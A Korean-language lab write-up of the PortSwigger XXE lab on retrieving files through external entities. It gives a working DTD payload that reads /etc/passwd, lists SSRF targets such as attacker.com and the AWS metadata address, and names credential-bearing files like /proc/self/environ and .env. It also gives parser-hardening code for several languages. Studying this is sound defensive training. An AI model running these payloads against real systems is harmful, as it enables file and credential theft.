# Lab: Exploiting XXE using external entities to retrieve files

## 개요

- **난이도**: Apprentice
- **주제**: XXE Injection — DTD External Entity / `SYSTEM file://` / 로컬 파일 읽기
- **링크**: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files

## 목표

XML 을 처리하는 재고 확인(stock check) 기능에 DTD `ENTITY` 선언을 삽입한다. `SYSTEM file:///etc/passwd` 로 서버 로컬 파일을 외부 엔티티로 정의하고, 해당 엔티티를 XML 본문에서 참조하면 파일 내용이 응답에 포함된다.

## XXE 기초

### XML 과 DTD

```xml
<!-- XML 문서 기본 구조 -->
<?xml version="1.0" encoding="UTF-8"?>
<root>
  <element>value</element>
</root>

<!-- DTD (Document Type Definition): XML 문서 구조와 엔티티 정의 -->
<!DOCTYPE root [
  <!ELEMENT root (element)>
  <!ENTITY name "value">      <!-- 내부 엔티티 -->
]>
```

### 엔티티(Entity) 종류

```
[내부 엔티티 — Internal Entity]
  <!ENTITY name "hardcoded value">
  사용: &name;
  → "hardcoded value" 로 치환

[외부 엔티티 — External Entity]
  <!ENTITY name SYSTEM "URI">
  사용: &name;
  → URI 에서 읽어온 내용으로 치환

  URI 종류:
    file:///etc/passwd       → 로컬 파일
    http://attacker.com/x   → 외부 URL (SSRF 가능)
    //attacker.com/x        → 프로토콜 생략

[파라미터 엔티티 — Parameter Entity]
  <!ENTITY % name SYSTEM "URI">
  사용: %name;
  → DTD 내부에서만 사용 (Out-of-band XXE 에서 활용)
```

### XXE 란

```
XML External Entity Injection

XML 파서가 외부 엔티티를 처리할 때
공격자가 정의한 URI(file://, http:// 등) 를 로드하는 취약점

공격자가 정의:
  <!ENTITY xxe SYSTEM "file:///etc/passwd">

파서가 실행:
  &xxe; 참조 위치에 /etc/passwd 파일 내용 삽입

결과:
  파일 내용이 응답에 포함 → 민감 정보 노출
```

## 공격 방법

### 취약한 원래 요청

```http
POST /product/stock HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

### XXE 페이로드 삽입

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

### 페이로드 구조 분석

```
<!DOCTYPE foo [ ... ]>
  → DTD 블록 시작
  → foo: 루트 엘리먼트 이름 (임의 값)

<!ENTITY xxe SYSTEM "file:///etc/passwd">
  → 외부 엔티티 xxe 정의
  → SYSTEM: 외부 리소스를 사용하겠다는 선언
  → "file:///etc/passwd": 로컬 파일 경로

<productId>&xxe;</productId>
  → &xxe; 참조 → 파서가 file:///etc/passwd 읽어서 치환
  → productId 값이 파일 내용으로 대체
```

### 응답 분석 — 400 Bad Request 와 취약점 노출

```http
HTTP/1.1 400 Bad Request

"Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
..."
```

```
왜 400 인가:
  서버가 productId 를 DB 에서 조회
  → productId 값이 파일 내용(문자열) → 유효하지 않음
  → 서버가 400 Bad Request 반환
  → 하지만 에러 메시지에 productId 값(= 파일 내용)을 포함

취약점이 노출되는 이유:
  400 응답이어도 파일 내용이 응답 body 에 있음
  → 공격 목적(파일 읽기) 달성!

400 응답에서도 취약점이 성립하는 조건:
  ① XML 파서가 외부 엔티티를 처리 (파일 읽기 성공)
  ② 에러 메시지에 입력값(파일 내용)이 반영
  → 이 두 조건이 맞으면 상태코드와 무관하게 노출
```

## 사용자 관점의 핵심 분석

### "400 이어도 취약점이 존재" 의 의미

```
일반적인 오해:
  400 Bad Request → 요청이 거부됨 → 안전함?

실제:
  400 은 HTTP 레벨 응답 코드
  XXE 는 XML 파서 레벨에서 처리
  → 파서가 먼저 엔티티를 해석 (파일 읽기 완료)
  → 그 다음 애플리케이션 로직이 400 반환
  → 순서상 파일은 이미 읽힌 후

WAS 가 응답 body 를 구성할 때:
  에러 메시지에 productId 값을 포함 → 파일 내용 노출
  에러 메시지에 productId 값 미포함 → 이 채널로는 노출 안 됨
    (Out-of-band XXE 나 Blind XXE 로 다른 방법 시도 필요)
```

### 방어 우선순위

```
[1순위 — XML 파서 레벨 차단]
  외부 엔티티 처리 자체를 비활성화
  → SYSTEM 키워드로 파일/URL 접근 차단
  → 파일을 읽지 않으므로 에러 메시지와 무관

  Java (DocumentBuilderFactory):
    factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
    factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

  Python (lxml):
    parser = etree.XMLParser(resolve_entities=False, no_network=True)

  PHP:
    libxml_disable_entity_loader(true);

[2순위 — 에러 응답 정제]
  에러 메시지에 입력값 미반영
  → 파일을 읽더라도 내용이 응답에 포함 안 됨
  → 단, 이것만으로는 Blind XXE / Out-of-band 가능

[3순위 — 파일시스템 권한]
  WAS 프로세스가 /etc/passwd 등 민감 파일에 접근 불가
  → 읽기 시도 자체를 OS 레벨에서 차단
  → 최소 권한 원칙 (Principle of Least Privilege)

결론:
  1순위(파서 설정) 가 가장 근본적
  2, 3순위는 심층 방어(Defense in Depth) 보조 수단
```

## 읽을 수 있는 파일 예시

```
/etc/passwd          → 사용자 목록 (비밀번호는 없지만 계정명, 경로 파악)
/etc/hostname        → 서버 호스트명
/etc/hosts           → 내부 네트워크 구조 파악
/etc/os-release      → OS 정보
/proc/self/environ   → 환경변수 (AWS 키, DB 비밀번호 등 포함 가능)
/proc/self/cmdline   → 프로세스 실행 명령어
/var/log/apache2/access.log → 접근 로그
WEB-INF/web.xml      → Java 앱 설정 (DB 접속 정보 등)
.env                 → 환경 설정 파일 (API 키 등)
```

## 핵심 정리

- DTD 블록(`<!DOCTYPE>`)에 `<!ENTITY xxe SYSTEM "file://...">` 를 삽입하면 XML 파서가 해당 파일을 읽어 엔티티로 치환한다.
- 응답이 400 Bad Request 라도 에러 메시지에 입력값이 포함되면 파일 내용이 노출된다 — HTTP 상태코드와 XXE 취약점 존재는 별개이다.
- 가장 근본적인 방어는 XML 파서 레벨에서 외부 엔티티(`SYSTEM`) 처리 자체를 비활성화하는 것이다.
- 에러 응답 정제와 파일시스템 권한 최소화는 보조 방어 수단이다.

## 배운 점 및 추가 학습

### 1. XXE 가 가능한 Content-Type

```
XML 을 처리하는 엔드포인트 식별:

직접적:
  Content-Type: application/xml
  Content-Type: text/xml
  Content-Type: application/soap+xml

잠재적 (파싱 방식에 따라):
  Content-Type: application/x-www-form-urlencoded
    → 일부 파서가 파라미터 값에 XML 포함 시 처리
  Content-Type: application/json
    → Content-Type 을 application/xml 로 변경해 시도

파일 업로드:
  .xlsx, .docx, .svg, .pdf 등 XML 기반 포맷
  → 내부 XML 에 엔티티 삽입 시 파서가 처리 가능
```

### 2. file:// URI 형식

```
파일 URI 스킴:
  file:///etc/passwd          → 절대 경로 (로컬)
  file://localhost/etc/passwd → 명시적 localhost
  file:///C:/Windows/win.ini  → Windows 경로

네트워크 URI:
  http://attacker.com/evil    → SSRF (외부 요청)
  https://attacker.com/evil
  //attacker.com/evil         → 프로토콜 상대 (http/https 자동)

내부 네트워크 (SSRF 연계):
  http://169.254.169.254/latest/meta-data/  → AWS 메타데이터
  http://192.168.1.1/admin                  → 내부 관리 페이지
```

### 3. XML 파서 외부 엔티티 비활성화 (언어별)

```java
// Java — DocumentBuilderFactory
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// DOCTYPE 자체를 차단 (가장 강력)

// Java — SAXParserFactory
SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

```python
# Python — lxml
from lxml import etree
parser = etree.XMLParser(
    resolve_entities=False,  # 외부 엔티티 해석 금지
    no_network=True          # 네트워크 접근 금지
)
tree = etree.parse(xml_input, parser)
```

```php
# PHP
libxml_disable_entity_loader(true);  // PHP 8.0 이전
// PHP 8.0 이후: 기본적으로 비활성화됨
```

```javascript
# Node.js — libxmljs2
const xml = libxmljs.parseXml(xmlString, {
    noent: false,   // 엔티티 해석 비활성화
    dtdload: false  // DTD 로드 비활성화
});
```
